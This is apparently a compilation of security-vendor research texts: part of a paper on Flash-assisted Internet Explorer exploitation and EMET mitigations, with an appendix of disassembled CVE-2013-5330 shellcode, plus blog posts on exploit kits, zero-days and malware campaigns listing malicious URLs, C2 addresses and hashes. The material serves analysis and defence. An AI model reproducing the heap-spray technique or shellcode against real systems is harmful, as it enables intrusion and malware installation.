In this section, we’ll focus the analysis on the Flash sample observed in the exploit of the CVE-2014-0322 vulnerability. At a higher level, the idea and the general functioning of this Flash assisted exploitation technique for IE is almost the same in all exploits seen for the CVE-2014-1761, CVE-2014-0322 and CVE-2013-3163 vulnerabilities. The Flash sample initially sprays a large amount Vector.<uint> on the heap, which is a very effective technique for spraying memory in a 32-bit IE process. Each Vector.<uint> is normally 0x1000 (one memory page) in length: 0x3fe DWORDs (v[0] to v[0x3fd]) plus another eight bytes for the Vector header. By spraying the heap deliberately, the attacker is trying to put some controlled data at some almost predictable memory location in higher addresses. In this case, the attacker expects to have some controlled data around memory address 0x1a1b????. The next step performed by the exploit is to trigger the UAF vulnerability in IE. The in between Flash/IE exploit step is possible due to the availability of the ExternalInterface.call() method in Flash, which allows Flash to call the JavaScript function which can trigger the bug. The IE vulnerability is triggered with a specially crafted CMarkup object which will have references to the controlled data sprayed earlier with Flash, as seen in Figure 10.
Figure 10. Specially crafted CMarkup object.
The attacker has to achieve the goal of abusing the freed object in IE in order to corrupt the size of a Flash Vector which has to be located exactly at memory address 0x1a1b2000 and without causing a crash. The specific memory layout crafted by the attacker will cause IE to start using a fake CMarkup object. This will lead into a subfunction of the MSHTML.DLL module, which executes the instruction ‘inc dword ptr [eax+10h]’ twice, with the EAX register pointed exactly to the data allocated as the Flash Vector (see Figure 11).
Figure 11. CVE-2014-0322 attack using vectors in ActionScript.
Since the first DWORD of the Vector is the size of the Vector, the size of Vector v1 has now been increased. Now the size of v1 has been increased. Hence, v1[0x3fe] can be accessed via ActionScript. As v1[0x3fe] is actually the first DWORD of the adjacent, Vector v2, this means that by changing the value of v1[0x3fe], the size of v2 (the next Vector adjacent to v1 in memory) is also changed. The exploit code sets v1[0x3fe] to an oversized value, 0x3ffffff0, so the size of v2 has now been increased to 0x3ffffff0, and the attacker can use v2 to access an arbitrary memory location for read and write actions [18].",0.01958814045580637
6. Mitigation,0.007777352920875891
6.1 Mitigation from Adobe,0.00772405783597363
"6.1.1 Constant blinding
Version 11.8 of Adobe Flash Player has introduced constant blinding in the JIT compiler as a mitiga-tion against JIT spray attacks. For the ActionScript code snippet shown in Figure 12, the constant 0x80000000 has been ‘blinded’ with a random expression, 0xCABAE6C3 ^ 0x4ABAE6C3, which makes the JIT compiler-generated code unpredictable and mitigates the JIT spray attack accordingly.
Figure 12. ActionScript snippet.",0.014965840832950161
"6.2 Mitigation from Microsoft
Microsoft is continuously investing in the area of mitigation research [19] against memory corruption exploits – in fact, newer versions of Windows and IE come with a good arsenal of mitigations [20] and multiple barriers that attackers will have to overcome in order to successfully execute code or take persistent control of a computer even when there’s an unpatched vulnerability available. DEP, ASLR/HiASLR (high entropy ASLR), SEHOP (structured exception handling overwrite protection), VTGUARD (V-Table guard) and Enhanced Protected Mode (EPM) for IE are just a few examples of new technologies that help raise the bar against exploitation. For example, the JIT compiler used by IE9 and later versions implements a similar form of constant blinding mitigation to prevent JIT spray attacks in JavaScript.
Microsoft also provides a free tool, the Enhanced Mitigation Experience Toolkit (EMET), which can be helpful in mitigating the attacks that originated from memory corruption exploits for any software, including browsers and plug-ins, such as Adobe Flash Player:
‘[It] is a utility that helps prevent vulnerabilities in software from being successfully exploited. EMET achieves this goal by using security mitigation technologies. These technologies function as special protections and obstacles that an exploit author must defeat to exploit software vulnerabilities. These security mitigation technologies do not guarantee that vulnerabilities cannot be exploited. However, they work to make exploitation as difficult as possible to perform.’ [21]
EMET can be downloaded (free of charge) from http://www.microsoft.com/emet. The latest stable and supported versions are EMET 4.1 Update 1 and EMET 5.0. The goal of this tool is to enable and provide additional security mitigations that are designed to break common exploitation techniques used by attackers. It is known that exploit mitigations do not completely eliminate the vulnerabilities. With tools like EMET, however, it is possible to raise the cost of developing a successful and reliable working exploit by introducing hardening and checks that will lead the exploit code to terminate or crash unexpectedly. In our lab, a Windows 7 machine equipped with EMET 4.1 (released in early November 2013) was tested against samples from the two Flash exploits analysed in this paper. The results are shown in Table 5.
EMET 4.1/OS Mitigation
CVE-2013-5330
CVE-2014-0497
DEP
B
B
SEHOP
N/A
N/A
NullPage
N/A
N/A
HeapSpray
N/A
N/A
EAF
B
X
MandatoryASLR
B
B
Bottom-Up ASLR
N/A
N/A
LoadLib
N/A
N/A
Caller
X
X
SimExecFlow
N/A
X
StackPivot
X
X
AntiDetour
X
N/A
Table 5. EMET mitigation.[1]
In the case of CVE-2013-5330, the attacker attempts to bypass the DEP protection mechanism from the operating system by using JIT-spray techniques. The attacker was also able to bypass ASLR and disclose module memory addresses with the capabilities of the exploit primitive provided by the specific Flash vulnerability (out-of-bound read/write using li32/si32 opcodes), which is a very optimal situation for an exploit writer (normally the attacker would have to work hard to craft this type of primitive). In order to bypass EAF, the shellcode is kept minimal and assembled directly from ActionScript filling the API placeholders and without using any dynamic resolution that requires Export Table parsing. Furthermore, to bypass certain user-mode hooks from security products, the JIT code attempts to call VirtualProtect+5 instead of jumping at the beginning of the VirtualProtect function. To do so, the attacker re-implements the missing prologue in the JIT code.
The first EMET mitigation to be effective against this exploit is AntiDetour, a mechanism which increments randomly the number of bytes detoured for each API and fills the original bytes after APIfunction+5 with INT3 opcode, which will raise an exception. When the JIT code attempts to execute VirtualProtect+5, skipping the hooked prologue (see Table 2), it will end up crashing on this opcode. It’s also interesting to note that even if this exploit doesn’t use a ROP chain (it uses JIT generated gadgets instead), some ROP mitigations from EMET are still triggering and preventing exploitation. After analysis, we realized that the reason is because the JIT code performs some kind of stack-pivoting in order to fetch some of the information needed to carry over further exploitation in the shellcode. Because this stack-pivoting effect is never restored and ESP is kept out of stack boundaries, when the shellcode attempts to call some API, the ROP mitigations will detect this anomaly and also terminate the exploit with StackPivot mitigation.
In the case of CVE-2014-0497 (see Figure 13), our tests showed that the exploit was blocked by multiple EMET mitigations because the attacker used pure ROP techniques in order to bypass DEP. In fact, the exploit attempts to call VirtualProtect using a small ROP chain that is detected by SimExecFlow mitigation (a simulation-based heuristic to detect gadget execution). In addition to this, Caller and StackPivot mitigations are also able to stop and detect anomalies during the execution of the exploit (the stack is pivoted and the code transfer to VirtualProtect doesn’t come from a legitimate function). Finally, EAF mitigation triggers at the final stage when the shellcode is executed and tries to parse the KERNEL32 export table.
Figure 13. Decoded ROP chain for the CVE-2014-0497 exploit.
While it is possible that a sophisticated attacker with knowledge of EMET and with enough skills and time may be able to target all the mitigations and attempt to bypass them or to use techniques not yet protected by EMET, it has been observed that the tool still represents a strong defence-in-depth strategy and it is helpful in blocking a large class of common attacks also seen in targeted attacks [22]. The major advantage is that EMET provides hardening and mitigations without the need for signature updates, and also works in a generic way for older applications.",0.019265765625160358
"7. Conclusion and future work
This paper discussed the vulnerability and exploits of Adobe Flash Player. In addition, it also revealed how vulnerabilities in other software, such as web browsers, could be exploited more generically by using SWF files. Both Adobe and Microsoft have actively been involved in the mitigation of web attacks. Adobe has introduced constant blinding which mitigates the JIT spray attack, and Microsoft’s EMET and improvements in recent IE versions can also help to mitigate zero-day attacks that leverage Flash-based exploits.
The use of SWF in attacks will continue, and will evolve in the long term due to the popularity of the plug-in and its large market share. We will continue tracking, analysing and eliminating these threats
During our research into these Adobe Flash Player vulnerabilities, we have noticed that sometimes it is fairly difficult to debug SWF files due to the limitations of current debuggers and reversing tools and the availability of cheap-but-powerful obfuscation tools. A byte-code-level SWF debugger could make the analyst’s life much easier.
We urge Adobe to provide a byte-code-level SWF debugger for the anti-malware industry.",0.015484614105079286
"Acknowledgement
We would like to thank the MMPC (Microsoft Malware Protection Center) technical writing team for their great efforts in reviewing this paper.",0.016499037541786277
"Bibliography
[1] Adobe Flash Player home page. http://www.adobe.com/au/products/flashplayer.html.
[2] DVLabs, Pwn2Own 2013 Overview. http://dvlabs.tippingpoint.com/blog/2013/01/17/pwn2own-2013.
[3] Pwn2Own, Pwn2Own 2014: The lineup. http://www.pwn2own.com/2014/03/pwn2own-2014-lineup/.
[4] Evans, C. Scarybeast Security, Together we can make a difference. http://scarybeastsecurity.blogspot.in/2014/ 03/together-we-can-make-difference.html. See also shared spreadsheet https://docs.google.com/spreadsheet/ccc?key=0Au_usSLlqH60dEptUVJLRjUzcjI4eHNjYmRpS2I3bVE&usp=drive_web#gid=0.
[5] Adobe Labs blog. Alchemy released on Labs. http://blogs.adobe.com/labs/archives/2008/11/alchemy_release.html.
[6] Adobe Labs blog, Project “Alchemy” is now the Flash Runtime C++ Compiler (FlasCC). http://blogs.adobe.com/labs/archives/2012/10/project-alchemy-is-now-the-flash-runtime-c-compiler-flascc.html.
[7] Adobe blog. Open source Flash C++ compiler, CrossBridge. http://blogs.adobe.com/flashplayer/2013/06/open-source-flash-c-compiler-crossbridge.html.
[8] JacksonDunstan.Com, An ASC 2.0 domain memory opcodes primer. http://jacksondunstan.com/articles/2314.
[9] Adobe security bulletin APSB13-26. http://www.adobe.com/support/security/bulletins/apsb13-26.html.
[10] Malware don’t need Coffee, CVE-2013-5330 (Flash) in an unknown Exploit Kit fed by high rank websites. http://malware.dontneedcoffee.com/2014/02/cve-2013-5330-flash-in-unknown-exploit.html.
[11] MMPC blog. A journey to CVE-2013-5330 exploit. http://blogs.technet.com/b/mmpc/archive/2014/02/10/a-journey-to-cve-2013-5330-exploit.aspx.
[12] Yu, Y. ROPs are for the 99 per cent (p.47, ‘Interdimensional’). https://cansecwest.com/slides/2014/ROPs_are_for_the_99_CanSecWest_2014.pdf.
[13] MMPC threat encyclopedia. TrojanSpy:Win32/Lurk. http://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=TrojanSpy:Win32/Lurk.
[14] Adobe security bulletin APSB14-04. http://helpx.adobe.com/security/products/flash-player/apsb14-04.html.
[15] McAfee Blog. Flash zero-day vulnerability CVE 2014 0497 lasts 84 days. http://blogs.mcafee.com/mcafee-labs/flash-zero-day-vulnerability-cve-2014-0497-lasts-84-days.
[16] MMPC blog, A journey to CVE-2014-0497 exploit. http://blogs.technet.com/b/mmpc/archive/2014/02/17/a-journey-to-cve-2014-0497-exploit.aspx.
[17] MMPC threat encyclopedia. TrojanDownloader:Win32/Siromost.A. http://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=TrojanDownloader:Win32/Siromost.A.
[18] Serna, Fermin J. Flash JIT – Spraying info leak gadgets. http://zhodiac.hispahack.com/my-stuff/security/Flash_Jit_InfoLeak_Gadgets.pdf.
[19] Microsoft Security Research and Defense blog. Software defense: Mitigating common exploitation techniques. http://blogs.technet.com/b/srd/archive/2013/12/11/software-defense-mitigating-common-exploitation-techniques.aspx.
[20] Johnson, K.; Miller, M. Exploit mitigation improvements in Windows 8. http://media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller_Exploit_Mitigation_Slides.pdf.
[21] Microsoft support. The Enhanced Mitigation Experience Toolkit. http://support.microsoft.com/kb/2458544.
[22] Niemelä, J. Statistically effective protection against APT attacks. https://www.virusbtn.com/pdf/conference_slides/2013/Niemela-VB2013.pdf.",0.018113364636115237
"Appendix
Shellcode used by CVE-2013-5330 exploit:
add    esp,0E000h
push   ebx
push   2048h
push   0
mov    eax,offset kernel32!GlobalAlloc (7c80fdbd)
call   eax
mov    esi,eax
push   esi
push   2048h
mov    eax,offset kernel32!GetTempPathA (7c835de2)
call   eax
test   eax,eax
je     04bf22eb
push   esi
push   0
push   0
push   esi
mov    eax,offset kernel32!GetTempFileNameA (7c861807)
call   eax
test   eax,eax
je     04bf22eb
push   0
push   80h
push   2
push   0
push   0
push   40000000h
push   esi
mov    eax,offset kernel32!CreateFileA (7c801a28)
call   eax
mov    edi,eax
cmp    edi,0FFFFFFFFh
je     04bf22eb
push   0
push   esp
mov    eax,18200h
push   eax
push   edi
mov    edi,3EF39F0h
pop    ebx
push   edi
push   ebx
mov    eax,offset kernel32!WriteFile (7c810e17)
call   eax
test   eax,eax
je     04bf22eb
push   ebx
mov    eax,offset kernel32!CloseHandle (7c809bd7)
call   eax
push   esi
mov    eax,offset kernel32!LoadLibraryA (7c801d7b)
call   eax
pop    esp
popad
ret    8",0.03118711674397423
"[1] N/A = mitigation not applicable for the type of exploitation used
X = mitigation effective to stop the exploit sample
B = the exploit sample uses techniques designed to bypass this mitigation
",0.010516737710100643
"Another Hacking Team Flash Player 0day Uncovered (UPDATED)
Update: 07/15 7 As reported by Kafeine, Magnitude EK is now using this zero-day.",0.012427715823100205
"Update: 07/14 7 As reported by brooks_li, RIG EK is now using this zero-day.",0.010386483471135022
"Update: 07/13 7 AM PT As reported by Kafeine, Neutrino EK is now using this zero-day.",0.014254914513550765
"Update: 07/11 9 AM PT As reported by Kafeine, Angler EK is now using this zero-day.
Malwarebytes Anti-Exploit blocks this attack:
– – – –
The Hacking Team debacle has made headlines all week long and sparked a lot of debates over the sale of cyber weapons to various governments, including oppressive regimes.
It didn’t take very long for someone to identify a zero-day vulnerability in the Flash Player within the leaked documents. That vulnerability was almost instantly weaponized in exploit kits affecting consumers and businesses alike.
On a late Friday night, yet another zero-day targeting once again the Flash Player has been uncovered from this very same Hacking Team archive. Adobe released a security bulletin shortly after:
Malwarebytes Anti-Exploit users are already protected against this specific attack (CVE-2015-5122):",0.014080889310757905
"While the software vendor quickly works on a patch expected to be released the week of July 12th, cyber-criminals are without a doubt racing against time to get it into their exploit kit.
During that period of time when no patch exists and the vulnerability is exploited, the number of potential victims of drive-by download attacks is considerably higher.
",0.011945118127919763
"Microsoft 0-Days: An Explanation and Safety Tips
[Update]: Microsoft has announced it will issue a patch for the newly discovered IE zero day tomorrow as part of the November Patch Tuesday. The vulnerability, now labeled CVE-2013-3918 affects an ActiveX control in Internet Explorer. More details can be found on Microsoft’s website.
Last week we heard about a Windows zero day that allows attackers to remotely execute code by exploiting a specially crafted TIFF file. Researchers found the zero day was used in booby-trapped Word documents containing bogus TIFF images.
The zero day, which has been assigned CVE-2013-3906, is a flaw in a TIFF component that is part of Microsoft Office 2003 through 2010.
To make matters worse, a brand new zero day against Internet Explorer was discovered by security firm FireEye. Based on their analysis, the vulnerability affects IE 7, 8, 9 and 10.
The attack was identified on a US website which appears to have been targeted specifically due to its nature, which according to FireEye “draw{s} visitors that are likely interested in national and international security policy”.
This is not your run-of-the-mill drive-by download. The payload is never actually written on disk since shellcode is injected directly into memory. (Typically, exploits download and run one or more malware binaries from the local hard drive).
Malware that is only resident in memory runs the chance of being unexpectedly terminated if the user shutdown or reboots her machine.
However, this is a small price to pay to make an attack very stealthy and perhaps achieving persistence could be done by reinfecting the user every time she revisits that website.
FireEye said this latest threat ,which installs a Remote Administration Tool (RAT), has ties with a previous one dubbed Operation DeputyDog which targeted Japan.
Microsoft’s November’s Patch Tuesday is just around the corner, but the TIFF vulnerability and this new IE zero day will not get addressed this time around.
However, here’s what you can do right now to protect your systems. Microsoft has released a temporary Fix-it tool for the TIFF exploit here.
Regarding Internet Explorer, it is safer to use a different browser while a patch is released.
But not everyone can do that. Last week the Washington Post reported that “South Korea is stuck with Internet Explorer for online shopping because of security law”.
Certainly these latest threats affecting Microsoft software are set to reignite the fire within the browser wars.
To protect yourself against web or file based exploits, don’t forget to check out Malwarebytes Anti-Exploit which blocks known exploits as well as zero days.",0.014586881716799449
"Jerome Segura (@jeromesegura) is a senior security researcher at Malwarebytes.
",0.014504426412314309
"Exploit kits: Spring 2018 review
Since our last report on exploit kits, there have been some new developments with the wider adoption of the February Flash zero-day, as well as the inclusion of a new exploit for Internet Explorer. We have not seen that many changes in the drive-by landscape for a long time, although these are the results of improvements closely tied to malspam campaigns and exploits embedded within Microsoft Office.
Since both Flash and the VBScript engine are pieces of software that can be leveraged for web-based attacks, it was only natural to see their integration into exploit kits. While Internet Explorer is not getting any younger, CVE-2018-8174 brings an update to an otherwise 2-year-old vulnerability (CVE-2016-0189), which is still used in some drive-by campaigns. As far as Flash is concerned, CVE-2018-4878 has been adopted by almost all exploits kits. At the time of this writing, a newer Flash vulnerability (CVE-2018-5002) is available but has not been spotted in any EK so far.",0.013050988944707242
"RIG
RIG exploit kit remains the most commonly observed EK in the wild, with several different campaigns in action. RIG was the first to include the new VBScript engine exploit (CVE-2018-8174) in IE only days after a Proof of Concept became publicly available, on top of adding CVE-2018-4878. RIG has pushed various payloads such as Bunitu, Ursnif, and the popular SmokeLoader.",0.014144798270113834
"GrandSoft
GrandSoft is an IE-only exploit kit which is observed in a smaller range of distribution campaigns, mostly via malvertising on adult sites. In comparison to its counterparts, GrandSoft is still relying on the older Internet Explorer exploit (CVE-2016-0189) and lacks the obfuscation we normally see in landing pages. Some payloads pushed by GrandSoft include the AZORult stealer.",0.010189878191026014
"Magnitude
The South Korea–focused exploit kit is back to using its trusted EK Magniber after having a short stint with GandCrab ransomware. Magnitude added Flash (CVE-2018-4878) and went on to integrate IE’s CVE-2018-8174 after a hiatus of about a week with no activity. With its own Magnigate filtering, Base64-encoded landing page and fileless payload, Magnitude is one of the more sophisticated exploit kits on the market.",0.011740328157850977
"GreenFlash Sundown
The elusive GreenFlash Sundown continues to strike via compromised OpenX ad servers. Although it is usually seen distributing the Hermes ransomware, 360 Total Security observed a cryptocurrency miner via several Chinese websites running a vulnerable OpenX version. The ad banner used by GF Sundown in this attack, as well as some we documented before, is a Korean language picture that hides CVE-2018-4878 using steganography.",0.014770416569699907
"A busy 2018
There is no doubt that the recent influx of zero-days has given exploit kits a much-needed boost. We did notice an increase in RIG EK campaigns, which probably resulted in higher than usual successful loads for its operators. While attackers are concentrating on Microsoft Office–related exploits, we are observing a cascading effect into exploit kits.
So far, 2018 has been busier than usual with the discoveries of several directly applicable zero-days, and we can expect to see more in the coming months. For instance, we have already witnessed back-to-back Flash zero-days where attackers are capitalizing on ActionScript vulnerabilities.
Mitigation
We tested these exploit kits against Malwarebytes, and they were all blocked thanks to our signature-less anti-exploit engine:",0.012844378258174638
"Hashes for samples referenced in this post:
RIG
8CA1DEDCED7332AEDC94291F8DAA82E0837A1EFC612B581DD13165B29F2A6DBB
21358ACDEB60C456BC36B8E3481BF66CC5F4167D5994F097F71798341B9119FB
560031AC4C947B1E168704CA5E323BF00A801E2320E1F0FFFE08392179D38391
AC1FF2B2A18931C17A5D9D0305CE72CC69C1688DFC2BDF4BF74AA9E27123BFFD
GrandSoft
E659DD280514DD81BF8923315BD503E8781EB8CE7684F4888A838CF2A8B2ADF0
Magnitude (dumped from memory with PE-Sieve)
9491E8B30D37CB3BD0D206021EBE7396CA17BE3C8FBED2AC6DCE89D3CE0CAA27
GreenFlash (dumped from memory with PE-Sieve)
e600dec30c0f5080eab3d15f1210334429c3db0dd6a90f1e755709783ace6e85
",0.01718126954295196
Microsoft Internet Explorer Zero-day - CVE-2014-1776,0.011326517185417218
"A new vulnerability found in Microsoft Internet Explorer affects Internet Explorer versions 6 through 11. However, current reported attacks are targeting only Internet Explorer 9 through 11. The vulnerability allows attackers to remotely execute arbitrary code on the target machine by having the user visit a malicious website.",0.008723158767860117
This vulnerability has been assigned reference CVE-2014-1776.  The vulnerability lies in the way Internet Explorer handles Vector Markup Language and vector graphics rendering when Internet Explorer accesses a related object in memory which has been deleted or improperly allocated. This allows the attacker to execute arbitrary code in the context of the current user.,0.0070314504201626216
The Websense Approach,0.008937261104516647
As with any vulnerability it is always best to apply vendor patches to ensure complete protection from exploit attempts.  In this instance no patch or Fix It is available from Microsoft.,0.008654419223463883
"So, what now? The next best thing to do is to protect from the apparatus and delivery mechanisms used by the attackers.  When reports of low volume targeted attacks surface it is often not long before the attacks become more widespread after code targeting the vulnerability is incorporated into exploit kits.",0.012359425751554798
"At the time of writing attack samples are sparse so we are exploring the telemetry within our ThreatSeeker® Intelligence Cloud looking for exemplars and Indicators of Compromise. We shall update this blog with additional insights as more become available, but for now it does not look like use of this vulnerability is widespread.",0.011824948759810217
"Websense offers protection throughout the attack life cycle using the 7 Stages of Advanced Attacks model.  Typically we see the following scenario in such instances: a user will visit a website (most likely a compromised legitimate website, rather than one specifically registered by an attacker), thus initiating a Flash file download which sets the scene for a further call to a JavaScript payload.  This in turn triggers the vulnerability in Internet Explorer.  Attackers may use the opportunity of remote code execution to launch additional components within a reconnaissance or data theft attack.",0.01702657094929816
"In the absence of a patch or Fix It from Microsoft various mitigation techniques are available, including:",0.01293102980917793
"Most importantly do not use Administrative account for general tasks such as web-browsing. As the attacker inherits the rights of the current user, using a non-privileged account is highly advisable.",0.015318093252678966
Consider deploying Microsoft's Enhanced Mitigation Experience Toolkit (EMET v4.1) which is designed to make exploitation more difficult for attackers.,0.017519508512093496
Turn on Enhanced Protected Mode (EPM) in Internet Explorer. It is available for IE 10 and 11.,0.012828754693855804
Disabling Internet Explorer's Flash plugin will render the exploit non-functional.,0.013586171732108299
Disabling VML (unregistering vgx.dll) will turn off the vulnerable library.  You should certainly consider this if you are using Windows XP (see note below).,0.012031659018952867
"For organisation's that are flexible on browser choice you should consider adopting an alternative browser to Internet Explorer, at least prior to applying a patch from Microsoft.",0.013531021998293036
"More information about the vulnerability, and how to implement the aforementioned mitigation factors, can be found at Microsoft Security Advisory 2963983.",0.011849143345699753
"Further, now Windows XP is no longer supported by Microsoft this discovery leads prompts a timely reminder to consider alternatives to this still popular operating system, to better protect from vulnerabilities affecting Windows XP users.",0.012531701731093192
"Websense Security Labs will continue monitoring the situation and update this blog accordingly.
",0.016640922274265835
"Botched Flash 0day Gets Patched
Adobe has just released a patch for the infamous Flash Player to fix a vulnerability actively exploited in the wild by some exploit kits. This vulnerability was actually a zero-day (CVE-2016-1019) but exploit kit authors botched its integration which resulted in only affecting older versions of Flash.
Another saving grace was the fact that a “mitigation introduced in Flash Player 21.0.0.182 currently prevents exploitation of this vulnerability, protecting users running Flash Player 21.0.0.182 and later“.
Nonetheless, since this could be tweaked and made functional to work on fully patched versions as well, Adobe went on to fix the bug.
The Magnitude EK which has been very active as of late was in fact using CVE-2016-1019 for some time. As we reported earlier this month, several (still) active malvertising campaigns are pushing Magnitude with a little tweak, including a fingerprinting gate right before the landing page.
Magnitude EK: CVE-2016-1019 with Flash 20.0.0.306:",0.012078958288578967
The payload from this attack is the Cerber ransomware:,0.009127334150056288
CVE-2016-1019 is blocked by Malwarebytes Anti-Exploit:,0.007595299822550583
"Drive-by download attacks that involve compromised sites or malvertising continue to leverage the Flash Player as the preferred piece of software for exploitation.
As an end-user, you need to evaluate your situation and decide whether you should keep it installed or not. If you do, it is critical that you run an exploit mitigation tool in parallel due to the likelihood of zero-day attacks. In other words, the traditional advice to keep your software up to date is not sufficient when it comes to high risk plugins such as Flash.
Malwarebytes customers running Malwarebytes Anti-Exploit were already protected against this latest zero-day.
",0.010731273829315602
"Over the past few weeks, cybercriminals have been persistently spamvertising ‘Inter-company invoice’ themed emails, in an attempt to trick users into viewing the malicious .html attachment, or unpack and execute the malicious binary found in the attached archives. Upon clicking on the link, users are exposed to the client-side exploits served by the latest version of the Black Hole Exploit Kit.
More details: Sample screenshot of the spamvertised email:",0.01121153637903849
"Client-side exploits serving URL: hxxp://controlleramo.ru:8080/forum/links/column.php
Malicious payload dropping URL: hxxp://controlleramo.ru:8080/forum/links/column.php?hljhtc=33:2v:1h:2w:1m&uqsgtl=3h&hzwtug=2v:1k:1m:32:33:1k:1k:31:1j:1o&ttr=1n:1d:1g:1d:1h:1d:1f
Sample client-side exploits served: CVE-2010-0188
Malicious domain name reconnaissance:
controlleramo.ru
Name server: ns1.controlleramo.ru – 62.76.186.190
Name server: ns2.controlleramo.ru – 132.248.49.112
Name server: ns3.controlleramo.ru – 84.22.100.108
Name server: ns4.controlleramo.ru – 65.99.223.24
We’ve already seen the same domain used in another malicious attack – “‘Copies of Missing EPLI Policies’ themed emails lead to Black Hole Exploit Kit“, indicating that they’ve been both launched by the same party.
Upon successful client-side exploitation the campaign drops MD5: de48416449621ecd62b116cc41aa5bcc – detected by 30 out of 44 antivirus scanners as Worm:Win32/Cridex.E.
The first sample obtained from the attached archive, MD5: 03f5311ef1b9f7f09f6e13ff9599f367– is detected by 40 out of 44 antivirus scanners as Worm:Win32/Cridex.E. Upon execution the sample phones back to 95.142.167.193:8080/mx/5/A/in/ (AS29169). We’ve seen another malware campaign also phoning back to the same IP – “‘Regarding your Friendster password’ themed emails lead to Black Hole exploit kit“.
More MD5s are known to have phoned back to it as well:
MD5: cf6f40f1ce37fd8edefc447f68a88e1f – detected by 34 out of 41 antivirus scanners as VirTool:Win32/CeeInject
MD5: 2d2358dc42cd1abe0beda21b6db3a61c – detected by 27 out of 42 antivirus scanners as HEUR:Trojan.Win32.Generic
MD5: d4153d2c325d729c82fd8a96a94435f2 – detected by 39 out of 44 antivirus scanners as Worm:Win32/Cridex.E
MD5: e6f66ce084b9cc2f3f2f8c35b1636ab8 – detected by 21 out of 42 antivirus scanners as VirTool:Win32/Obfuscator.ZA
MD5: 45992c5b7fb455a0e15466a1e8a8c0f0 – detected by 38 out of 44 antivirus scanners as Worm:Win32/Cridex.G
MD5: d5de95df9a69bef997c21f9be9b0fc88 – detected by 37 out of 42 antivirus scanners as Trojan-Ransom.Win32.Birele.uhu
MD5: 56a35fa27f04131f86f0cd44bd8480c3 – detected by 32 out of 40 antivirus scanners as Worm:Win32/Cridex.E
MD5: de05549b469984316e0ec99a1bfe843a – detected by 39 out of 44 antivirus scanners as Trojan-Ransom.Win32.PornoAsset.akna
MD5: 7b9f0a74820a00b34cc57e7c02d1492c – detected by 39 out of 44 antivirus scanners as Worm:Win32/Cridex.E
The second sample obtained from yet another spamvertised archive with MD5: 3a8ce3d72b60b105783d74dbc65c37a6 – is detected by 37 out of 44 antivirus scanners as Worm:Win32/Cridex.E. Upon execution it phones back to the following URL: 188.40.0.138:8080/AJtw/UCyqrDAA/Ud+asDAA (AS24940, HETZNER-AS).
We’ve already seen malware analyzed in previous campaigns phoning back to the same URL, indicating that these campaigns have been launched by the same party – “Cybercriminals spamvertise bogus ‘Microsoft License Orders’ serve client-side exploits and malware“; “Spamvertised ‘US Airways reservation confirmation’ themed emails serve exploits and malware“.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.01180803774790018
Large Malvertising Campaign Leads to Angler EK & Bunitu Malware,0.01268746522945674
"<p>Websense&reg; Security Labs&trade; researchers have been monitoring a mass scale malvertising campaign that leads to&nbsp;<a href=http://blog.websense.com/security-labs/angler-exploit-kit-%E2%80%93-oper... target=""_blank"">Angler Exploit Kit</a>. The attack has affected users browsing to many popular sites, including CNN Indonesia, the official website of Prague Airport, Detik, AASTOCKS, RTL Television Croatia, and the Bejewled Blitz game on Facebook. According to<a href=""http://www.similarweb.com/"" target=""_blank""> SimilarWeb</a>, these sites have a combined total of at least 50 million visitors per month.</p>
<p><img alt="""" src=""/sites/default/files/blog/legacy/security-labs/yqngbrt.png"" style=""height:479px; width:966px"" /></p>
<p><em>Image 1. Heatmap of geographical locations affected by this malvertizing campaign in May 2015</em></p>
<p>The following are some of the key features of this campaign:</p>
<ul>
<li>&nbsp;Revive Adserver scripts are injected with code</li>
</ul>
<ul>
</ul>
<ul>
<li>&nbsp;The injected code is evasive&nbsp;and stealthy</li>
</ul>
<ul>
</ul>
<ul>
<li>&nbsp;Angler Exploit Kit infects the victim&#39;s machine with malware</li>
</ul>
<ul>
</ul>
<ul>
<li>&nbsp;The Bunitu trojan has been used</li>
</ul>
<ul>
</ul>
<ul>
<li>&nbsp;At least 50 million users per month are at risk
<ul>
</ul>
</li>
</ul>
<p>Websense customers are protected against this threat via real-time&nbsp;analytics with ACE,&nbsp;the Websense&nbsp;<a href=""http://www.websense.com/content/websense-advanced-classification-engine.... rel=""nofollow"" target=""_blank"">Advanced Classification Engine</a>, at the different&nbsp;<a href=""http://www.websense.com/content/seven-stages-recon.aspx?cmpid=slbl"" rel=""nofollow"" target=""_blank"">stages</a>&nbsp;of the attack detailed below:&nbsp;</p>
<ul>
<li>Stage 2 (Lure) &ndash; ACE has protection against websites injected with malicious content.</li>
<li>Stage 3 (Redirect)&nbsp;&ndash;&nbsp;ACE has protection against known redirects associated with this campaign.</li>
<li>Stage 4 (Exploit Kit) &ndash; ACE has protection against the Angler Exploit Kit and exploit delivery content via real-time analytics.</li>
<li>Stage 5 (Dropper) &ndash; ACE has protection against known Bunitu samples.</li>
<li>Stage 6 (Call Home) &ndash; ACE has detection for command and control infrastructure known to be associated with Bunitu.&nbsp;</li>
</ul>
<h3>What is Revive Adserver?</h3>
<p>Revive Adserver is an open source advertising technology formerly known as OpenX Source. It allows businesses to host and manage their own advertising services rather than relying on third party services, and it is common for multiple websites to use the same Revive Adserver script.</p>
<p>We have seen compromised Revive Adserver scripts used in malvertising&nbsp;<a href=""http://blogs.websense.com/security-labs/dissecting-cleartripcom-website-... target=""_blank"">in the past</a>, and seemingly this continues to be a target of interest for cybercriminals.</p>
<p><strong>Note</strong>: To clarify, OpenX (www.openx.com) is an enterprise software company which in 2013 sold OpenX Source to Revive Adserver. Revive Adserver (www.revive-adserver.com) built a new open source project on the original OpenX Source. Neither OpenX (the company) nor Revive Adserver currently support OpenX Source software, but many instances of OpenX Source are still in use and vulnerable to this malvertising exploit.</p>
<h3>Angler Exploit Kit Strikes Again</h3>
<p>The code injected into the compromised Revive Adserver scripts in this campaign have been seen to lead to the very prevalent Angler Exploit Kit.&nbsp;The injected code is not always sent when the script is requested, making it difficult to detect with automated analysis tools. In addition, Angler Exploit Kit will only serve up the malicious exploit code once per IP in a 24 hour period or so.</p>
